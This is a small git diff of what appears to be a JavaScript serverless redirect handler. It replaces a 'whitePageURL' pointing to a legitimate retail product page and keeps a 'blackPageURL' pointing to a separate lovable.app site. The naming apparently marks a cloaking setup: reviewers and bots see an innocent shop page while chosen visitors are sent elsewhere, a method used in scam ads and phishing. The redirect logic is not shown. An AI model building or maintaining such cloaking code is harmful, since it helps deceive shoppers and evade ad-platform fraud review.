@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://mastershop.com.au/collections/cases/products/speck-presidio-lux-grip-with-clicklock-iphone-17-standard-shade-orange";
-    const blackPageURL = "https://luvcshap.lovable.app/?";
+    const whitePageURL = "https://www.centrepointstores.com/ae/en/Toys/Novelty-%26-Collectibles/Collectibles/BABYSHOP-Rainbocorns-Mermaidcorn-Assorted-Surprise-Egg-Set/p/165846019";
+    const blackPageURL = "https://luvcshap.lovable.app/";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
